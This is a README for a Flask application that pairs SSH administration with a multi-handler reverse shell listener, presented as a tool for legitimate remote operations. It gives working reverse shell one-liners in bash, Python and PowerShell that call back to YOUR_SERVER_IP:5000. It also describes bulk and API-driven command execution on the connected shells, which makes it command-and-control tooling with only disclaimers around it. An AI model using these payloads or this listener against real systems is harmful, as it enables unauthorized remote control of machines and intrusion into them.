# RemoteOps Control Plane

RemoteOps is a Python 3.12 Flask control plane for legitimate remote administration over SSH and reverse shell management.

## Included features

### SSH Management
- Authentication with securely hashed app user passwords.
- Host inventory with grouping, active/disabled state, and strict host key mode.
- SSH auth options: key-based or password-based (encrypted at rest).
- Optional jump-host (bastion) connectivity per target host.
- Single-host command execution with persistent history.
- Bulk host import from CSV-like lines in UI.
- Bulk command execution across many hosts concurrently.
- Export SSH execution history to CSV.

### Reverse Shell Management
- **Multi-handler reverse shell listener** on port 5000 (similar to Metasploit's multi/handler).
- **Persistent connection tracking** - shells automatically reconnect and are tracked.
- **Concurrent session management** - handle multiple reverse shells simultaneously.
- **Interactive shell interface** - execute commands on connected shells with real-time output.
- **Bulk operations** - run commands across multiple shells at once.
- **Platform detection** - automatically detects Linux, Windows, macOS, etc.
- **Connection status indicators** - real-time online/offline status.
- **Export shell execution history** to CSV.
- **Grouping and organization** - organize shells by custom groups.

### Production Features
- Enhanced production-ready UI with modern styling.
- Pagination on all dashboards and history views.
- Comprehensive error handling with user-friendly messages.
- CSV export functionality for audit trails.
- Real-time status updates for operations.
- Responsive design for mobile and desktop.
- cPanel Passenger-compatible startup (`passenger_wsgi.py`).

## Security model

- Uses SSH transport for legitimate host management.
- **Reverse shell listener** for managing authorized company systems and VMs.
- App login passwords are hashed with Werkzeug.
- Stored SSH credentials are encrypted using `DATA_ENCRYPTION_KEY`.
- Supports strict host key validation by default.
- Admin-only host management and import.
- All reverse shell connections are logged and tracked.

> **Security Notice**: Reverse shell functionality should only be used on systems you own or have explicit authorization to access. This tool is designed for legitimate IT operations, infrastructure management, and authorized security testing.

> **Production Security**: The reverse shell listener binds to all interfaces (0.0.0.0) to accept connections from remote systems. In production environments:
> - Use firewall rules to restrict which IPs can connect to port 5000
> - Deploy behind a VPN or private network
> - Enable authentication at the network level
> - Monitor all connections via the audit logs

## Required environment variables

- `SECRET_KEY`: Flask session security key.
- `DATA_ENCRYPTION_KEY`: required to encrypt/decrypt SSH and jump-host passwords.
- `DATABASE_URL`: DB connection URL.
- `ADMIN_PASSWORD`: initial admin creation.

## SQLite path behavior fix

If `DATABASE_URL` is SQLite and uses a relative path (for example `sqlite:///instance/app.db`),
the app now resolves it to an absolute path automatically relative to the project root.
That avoids failures where cPanel/Passenger starts from a different working directory.

## Login/CSRF and migration fixes

- Login is built on `LoginForm(FlaskForm)` so CSRF token is present.
- `login` route control flow is corrected and stable.
- Added `migrations/env.py` with `render_as_batch=True` for SQLite schema changes.

## Fix for common error (`known_hosts`)

If you see:

- `SSH execution failed: Server 'localhost' not found in known_hosts`

then either:

1. add host keys to `~/.ssh/known_hosts`, e.g.:
   ```bash
   ssh-keyscan -H localhost >> ~/.ssh/known_hosts
   ```
2. or edit that host and uncheck **Strict host key validation**.

## Local setup (Python 3.12)

```bash
python3.12 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
cp .env.example .env
```

Edit `.env` and set secure values for:
- `SECRET_KEY` - Flask session security
- `DATA_ENCRYPTION_KEY` - For encrypting SSH passwords
- `DATABASE_URL` - Database connection (defaults to SQLite)
- `ADMIN_PASSWORD` - Initial admin password

Initialize DB and create admin:

```bash
flask --app app db init
flask --app app db migrate -m "initial schema"
flask --app app db upgrade
ADMIN_PASSWORD='strong-password' flask --app app create-admin
```

Run locally:

```bash
# Option 1: Use environment variables (recommended)
flask --app app run
# This will use FLASK_RUN_HOST and FLASK_RUN_PORT from .env (default: 127.0.0.1:8000)

# Option 2: Specify host and port explicitly
flask --app app run --host 127.0.0.1 --port 8000
```

**Important Port Configuration**:
- **Web Interface (Flask)**: Runs on port **8000** by default (configurable via `FLASK_RUN_PORT`)
- **Reverse Shell Listener**: Runs on port **5000** by default (configurable via `REVERSE_SHELL_PORT`)
- These are separate services on different ports to avoid conflicts
- The reverse shell listener starts automatically when the Flask app initializes
- Configure firewall rules to allow incoming connections to port 5000 for reverse shells

## Using Reverse Shell Features

### Connecting a Reverse Shell

The application provides a multi-handler reverse shell listener on port 5000. To connect a shell:

**Linux/macOS (Bash):**
```bash
bash -i >& /dev/tcp/YOUR_SERVER_IP/5000 0>&1
```

**Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell (Windows):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### Managing Reverse Shells via Web UI

1. **View Connected Shells**: Navigate to "Reverse Shells" in the top menu
2. **Interactive Shell**: Click "Interact" on a connected shell to execute commands
3. **Bulk Operations**: Use "Shell Bulk Ops" to run commands on multiple shells
4. **Export History**: Click "Export CSV" to download execution logs
5. **Organize**: Group shells by purpose (e.g., "production", "staging", "development")

### Using the API

The application provides RESTful API endpoints for programmatic access to reverse shell management.

#### Authentication

All API requests require authentication. Include your session cookie or use HTTP Basic Auth with your username and password.

#### List All Sessions

```bash
# Get all reverse shell sessions as JSON
curl -X GET http://localhost:8000/api/sessions \
  -u admin:password

# Response:
{
  "success": true,
  "count": 2,
  "sessions": [
    {
      "id": 1,
      "session_id": "abc123xyz",
      "name": "web-server-01",
      "address": "192.168.1.100",
      "port": 54321,
      "group_name": "production",
      "hostname": "web01.example.com",
      "platform": "Linux",
      "shell_user": "root",
      "status": "active",
      "connected_at": "2024-01-15T10:30:00",
      "last_seen": "2024-01-15T12:45:30",
      "disconnected_at": null,
      "notes": null
    }
  ]
}
```

#### Execute Command on Session

```bash
# Execute command on a specific session by session_id
curl -X POST http://localhost:8000/execute/abc123xyz \
  -H "Content-Type: application/json" \
  -u admin:password \
  -d '{"command": "whoami"}'

# Response:
{
  "success": true,
  "stdout": "root\n",
  "stderr": "",
  "exit_code": 0,
  "execution_time": 0.234,
  "execution_id": 42
}

# Error response (session not connected):
{
  "success": false,
  "error": "Session is not currently connected"
}
```

#### Export Data

```bash
# Export sessions to CSV
curl -X GET http://localhost:8000/export/sessions/csv \
  -u admin:password \
  -o sessions.csv

# Export sessions to JSON
curl -X GET http://localhost:8000/export/sessions/json \
  -u admin:password \
  -o sessions.json

# Export sessions to Excel
curl -X GET http://localhost:8000/export/sessions/xlsx \
  -u admin:password \
  -o sessions.xlsx

# Export command history to CSV
curl -X GET http://localhost:8000/export/commands/csv \
  -u admin:password \
  -o commands.csv
```

### Configuration Options

Set these environment variables to configure the reverse shell listener:

- `REVERSE_SHELL_PORT` - Port for reverse shell listener (default: 5000)
- `REVERSE_SHELL_BIND_ADDRESS` - Interface to bind to (default: 0.0.0.0)
- `REVERSE_SHELL_TIMEOUT` - Connection timeout in seconds (default: 30)
- `MAX_SHELL_SESSIONS` - Maximum concurrent sessions (default: 100)
- `SHELL_COMMAND_TIMEOUT` - Command execution timeout (default: 30)

Example `.env` configuration:
```bash
REVERSE_SHELL_PORT=5000
REVERSE_SHELL_BIND_ADDRESS=0.0.0.0
REVERSE_SHELL_TIMEOUT=30
MAX_SHELL_SESSIONS=100
SHELL_COMMAND_TIMEOUT=30
```

## cPanel deployment notes

1. Create Python App in cPanel (Python 3.12).
2. Set root to this project.
3. Install dependencies:
   ```bash
   ~/virtualenv/<cpanel_user>/<app_root>/3.12/bin/pip install -r ~/<cpanel_user>/<app_root>/requirements.txt
   ```
4. Set env vars in cPanel (`SECRET_KEY`, `DATA_ENCRYPTION_KEY`, `DATABASE_URL`, `ADMIN_PASSWORD`).
5. Startup file: `passenger_wsgi.py`, entrypoint: `application`.
6. Run migrations in app venv.
7. Restart from cPanel.
